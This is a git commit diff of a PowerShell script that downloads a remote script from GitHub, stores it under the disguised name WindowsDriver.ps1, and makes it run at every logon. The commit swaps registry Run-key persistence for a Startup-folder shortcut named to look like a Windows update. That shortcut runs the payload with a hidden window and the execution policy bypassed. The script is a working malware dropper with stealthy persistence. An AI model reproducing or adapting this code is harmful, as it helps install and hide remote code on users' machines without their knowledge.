a2fa714dd3acf23a9a62fc337134e8d1ec4d6e73
JiriWeiss <75065909+JiriWeiss@users.noreply.github.com>
2025-05-21 11:54:13 +0200

    Update Volkswagen2.ps1

--- Volkswagen2.ps1
+++ Volkswagen2.ps1
@@ -5,9 +5,9 @@ $payloadUrl = "https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1
 $localPath = "$env:APPDATA\WindowsDriver.ps1"
 Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath
 
-# 2. Nastav persistenci přes HKCU Run (nevyžaduje admin)
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "WinUpdateCheck"
-$regValue = "powershell.exe -WindowStyle Normal -ExecutionPolicy Bypass -File `"$localPath`""
-
-Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
+$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.lnk"
+$wsh = New-Object -ComObject WScript.Shell
+$shortcut = $wsh.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
+$shortcut.Save()
